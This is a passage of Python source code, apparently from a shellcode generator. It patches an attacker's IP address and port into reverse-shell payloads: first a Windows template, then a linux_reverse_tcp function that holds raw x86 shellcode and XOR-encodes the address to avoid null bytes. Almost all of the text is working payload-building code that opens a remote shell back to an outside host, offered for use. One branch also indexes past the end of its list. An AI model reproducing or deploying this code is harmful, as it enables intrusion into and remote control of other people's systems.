        #ip_hex = ip_bytes.replace("0x", "\\\\x")
        #print(ip_hex.upper().replace("X", "x"))
        remove_prefix = [s.replace("0x", "") for s in hex_ip_list]
        ip_bytes = [s.replace("2e", "2E") for s in remove_prefix]
        #print(ip_bytes)
        ip_len = len(ip_bytes)
        #print(ip_len)
        
        
        #ip = socket.inet_aton(ip)
        port = hex(socket.htons(int(port)))

        # Find valid XOR byte
        #byte1 = port[4:]
        #if byte1 == '':
        #    byte1 = '0'
        #byte2 = port[2:4]

        # Reverse Engineer: Convert Hex to Decimal byte1 and byte2
        # In Windows Shellcode must be inversed byte2 and byte1
        # Inject the port number
        code = code.replace("\\xBB\\x01", "\\x{b2}\\x{b1}".format(b1 = port[4:6].upper(), b2 = port[2:4].upper()))

        """
        Since the IP address of this shellcode is in ASCII

        Hex to ASCII (IPv4) values:
        30 = 0
        39 = 9
        2E = .

        Length in ASCII varies:
        1.1.1.1 = length 7
        192.168.111.111 = length 15
        
        IP Address in Hexcode:
        '\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x00\\x00\\x00\\x00\\x00\\x00'
        '\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x31\\x32\\x31\\x2e\\x31\\x32\\x39'
        """

        # Inject IPv4 address
        if ip_len == 7:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7]
            )) 
        elif ip_len == 8:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x00\\x00\\x00\\x00\\x00\\x00\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7]
            ))
        elif ip_len == 9:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x{b9}\\x00\\x00\\x00\\x00\\x00\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7],
                b9 = ip_bytes[8]
            ))
        elif ip_len == 10:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x{b9}\\x{b10}\\x00\\x00\\x00\\x00\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7],
                b9 = ip_bytes[8],
                b10 = ip_bytes[9]
            ))
        elif ip_len == 11:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x{b9}\\x{b10}\\x{b11}\\x00\\x00\\x00\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7],
                b9 = ip_bytes[8],
                b10 = ip_bytes[9],
                b11 = ip_bytes[10]
            ))
        elif ip_len == 12:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x{b9}\\x{b10}\\x{b11}\\x{b12}\\x00\\x00\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7],
                b9 = ip_bytes[8],
                b10 = ip_bytes[9],
                b11 = ip_bytes[10],
                b12 = ip_bytes[11]
            ))
        elif ip_len == 13:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x{b9}\\x{b10}\\x{b11}\\x{b12}\\x{b13}\\x00\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7],
                b9 = ip_bytes[8],
                b10 = ip_bytes[9],
                b11 = ip_bytes[10],
                b12 = ip_bytes[11],
                b13 = ip_bytes[12]
            ))
        elif ip_len == 14:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x{b9}\\x{b10}\\x{b11}\\x{b12}\\x{b13}\\x{b14}\\x00".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7],
                b9 = ip_bytes[8],
                b10 = ip_bytes[9],
                b11 = ip_bytes[10],
                b12 = ip_bytes[11],
                b13 = ip_bytes[12],
                b14 = ip_bytes[13]
            ))
        elif ip_len == 15:
            code = code.replace("\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00\\x00",
            "\\x{b1}\\x{b2}\\x{b3}\\x{b4}\\x{b5}\\x{b6}\\x{b7}\\x{b8}\\x{b9}\\x{b10}\\x{b11}\\x{b12}\\x{b13}\\x{b14}\\x{b15}".format(
                b1 = ip_bytes[0],
                b2 = ip_bytes[1],
                b3 = ip_bytes[2],
                b4 = ip_bytes[3],
                b5 = ip_bytes[4],
                b6 = ip_bytes[5],
                b7 = ip_bytes[6],
                b8 = ip_bytes[7],
                b9 = ip_bytes[8],
                b10 = ip_bytes[9],
                b11 = ip_bytes[10],
                b12 = ip_bytes[11],
                b13 = ip_bytes[12],
                b14 = ip_bytes[13],
                b15 = ip_bytes[14]
            ))
        else:
            print("[-] An unexpected error happened!")

        #code = hex_format(bytes(code, encoding='ascii'))

        return code

    def linux_reverse_tcp(ip, port):
        """
        Replaces IP and PORT
        """

        code =  ""
        code += "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2"
        code += "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb"
        code += "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66"
        code += "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0"
        code += "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02"
        code += "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8"
        code += "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2"
        code += "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0"
        code += "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6"
        code += "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f"
        code += "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
        code += "\\xe3\\xb0\\x0b\\xcd\\x80"

        ip = socket.inet_aton(ip)
        port = hex(socket.htons(int(port)))

        # Find valid XOR byte
        byte1 = port[4:]
        if byte1 == '':
            byte1 = '0'
        byte2 = port[2:4]
        
        ip_bytes = []
        xor_bytes = []
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][-2:])
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][-4:-2])
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][-6:-4])
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][:-6])
        for b in range(0, 4):
            for k in range(1, 255):
                    # Make sure there is no null byte
                    if int(ip_bytes[b], 16) ^ k != 0:
                            ip_bytes[b] = hex(int(ip_bytes[b], 16) ^ k)[2:]
                            xor_bytes.append(hex(k)[2:])
                            break

        # Inject the port number
        code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{}\\x{}".format(
            byte1,
            byte2
        ))

        # Inject the XOR bytes
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x1}\\x{x2}\\x{x3}\\x{x4}".format(
            x1 = xor_bytes[3],
            x2 = xor_bytes[2],
            x3 = xor_bytes[1],
            x4 = xor_bytes[0]
        ))

        # Inject IPv4 address
        code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
            b1 = ip_bytes[3],
            b2 = ip_bytes[2],
            b3 = ip_bytes[1],
            b4 = ip_bytes[0]
        ))

        #code = hex_format(bytes(code, encoding='ascii'))

        return code